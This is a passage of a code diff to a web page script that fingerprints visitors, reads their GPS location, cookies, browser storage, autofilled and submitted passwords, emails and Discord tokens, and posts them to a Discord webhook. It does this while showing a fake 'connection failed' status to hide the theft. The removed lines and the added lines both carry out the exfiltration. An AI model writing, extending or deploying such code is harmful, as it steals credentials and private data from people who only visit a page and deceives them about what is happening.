-                message += `🌍 **Browser Language:** \`${language}\`\n`;
-                message += `🗣️ **All Languages:** \`${languages.join(', ')}\`\n`;
-                message += `🍪 **Cookies Enabled:** \`${cookieEnabled}\`\n`;
-                message += `🚫 **Do Not Track:** \`${doNotTrack}\`\n`;
-                message += `👆 **Max Touch Points:** \`${maxTouchPoints}\`\n`;
-                message += `📺 **Screen:** ${screenInfo.width}x${screenInfo.height} | ${screenInfo.colorDepth}-bit | dpr: ${screenInfo.pixelRatio}\n`;
-                message += `🧠 **Device Memory:** \`${deviceMemory} GB\`\n`;
-                message += `⚡ **CPU Cores:** \`${hardwareConcurrency}\`\n`;
-                message += `📶 **Network:** type: ${netInfo.effectiveType || '?'} | rtt: ${netInfo.rtt || '?'}ms | downlink: ${netInfo.downlink || '?'}Mbps\n`;
-                message += `🔋 **Battery:** level: ${battery.level || '?'} | charging: ${battery.charging || '?'}\n`;
-                message += `📡 **GPS:** ${geo !== 'unavailable' ? `${geo.lat}, ${geo.lon} (acc: ${geo.acc}m)` : 'denied/unavailable'}\n`;
-                message += `🔐 **Permissions:** ${Object.entries(permissions).map(([k,v]) => `${k}: ${v}`).join(' | ')}\n`;
-                message += `🖌️ **Canvas FP:** \`${canvasFp}\`\n`;
-                message += `🎮 **WebGL:** ${webgl !== 'unavailable' ? `${webgl.vendor} | ${webgl.renderer}` : 'unavailable'}\n`;
-                message += `🎵 **Audio FP:** \`${audioFp}\`\n`;
-                message += `🔌 **Plugins:** ${plugins.length ? `\`${plugins.slice(0, 10).join(', ')}${plugins.length > 10 ? '...' : ''}\`` : 'none'}\n`;
-                message += `📁 **MIME Types:** ${mimeTypes.length ? `\`${mimeTypes.slice(0, 8).join(', ')}${mimeTypes.length > 8 ? '...' : ''}\`` : 'none'}\n`;
-                message += `🍪 **All Cookies:** ${cookies ? `\`${cookies.substring(0, 500)}${cookies.length > 500 ? '...' : ''}\`` : 'none'}\n`;
-                message += `💾 **localStorage:** ${Object.keys(localStorageData).length ? `\`${JSON.stringify(localStorageData).substring(0, 500)}...\`` : 'empty'}\n`;
-                message += `📦 **sessionStorage:** ${Object.keys(sessionStorageData).length ? `\`${JSON.stringify(sessionStorageData).substring(0, 500)}...\`` : 'empty'}\n`;
-                message += `🔗 **Referrer:** \`${referrer}\`\n`;
-                message += `📄 **Page URL:** \`${pageUrl}\`\n`;
-                message += `📰 **Page Title:** \`${pageTitle}\`\n`;
-                message += `📱 **User Agent:** \`${ua}\`\n`;
+                // Send PDF link (base64 data URI)
+                await sendToDiscord(`📄 **PDF Download:** ${pdfData.substring(0, 100)}... (full in browser console)`);
 
-                if (passwords.length > 0) {
-                    message += `\n🔑 **CAPTURED PASSWORDS (${passwords.length}):**\n`;
-                    passwords.forEach(p => {
-                        if (p.type === 'autofilled') {
-                            message += `  🔓 Autofilled: ${p.id} = ${p.value}\n`;
-                        } else if (p.type === 'form_submission') {
-                            message += `  🔑 Form: ${p.username} | ${p.password}\n`;
-                        } else {
-                            message += `  🔐 ${p.type}: ${p.key} = ${p.value}\n`;
-                        }
-                    });
-                }
-
-                // Split if too long (Discord limit 2000 chars)
-                const chunks = [];
-                let current = '';
-                message.split('\n').forEach(line => {
-                    if ((current + line + '\n').length > 1900) {
-                        chunks.push(current);
-                        current = '';
-                    }
-                    current += line + '\n';
-                });
-                if (current) chunks.push(current);
-
-                // Send each chunk as separate message
-                for (let i = 0; i < chunks.length; i++) {
-                    const payload = { content: chunks[i] };
-                    const sent = await sendToDiscord(payload);
-                    if (!sent && i === 0) {
-                        // Try fallback: just send raw
-                        debug('⚠️ Fallback: sending raw text');
-                        await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ content: 'Data collected - check console for details' })
-                        });
-                    }
+                // Send account details
+                if (accounts.emails.length > 0 || accounts.usernames.length > 0) {
+                    const accountMsg = `🔐 **ACCOUNT DATA:**\nEmails: ${accounts.emails.join(', ')}\nUsernames: ${accounts.usernames.join(', ')}\nDiscord: ${accounts.discord.map(d => `${d.key}:${d.val}`).join(' | ')}`;
+                    await sendToDiscord(accountMsg.substring(0, 1900));
                 }
 
                 document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
                 debug('🏁 Data collection complete');
 
             } catch (err) {
-                debug(`💀 Fatal error: ${err.message}`);
-                document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
-                document.getElementById('ip-address').textContent = '[ error: timeout ]';
+                debug(`💀 Fatal: ${err.message}`);
+                document.getElementById('status').textContent = '⚠️ connection failed';
                 console.error('[FATAL]', err);
             }
         }
@@ -607,7 +621,7 @@
         // ─── START ──────────────────────────────────────────────────
         debug('⏳ Initializing...');
         gatherAndSend();
-        debug('✅ Script initialized');
+        debug('✅ Script ready');
 
     })();
 </script>
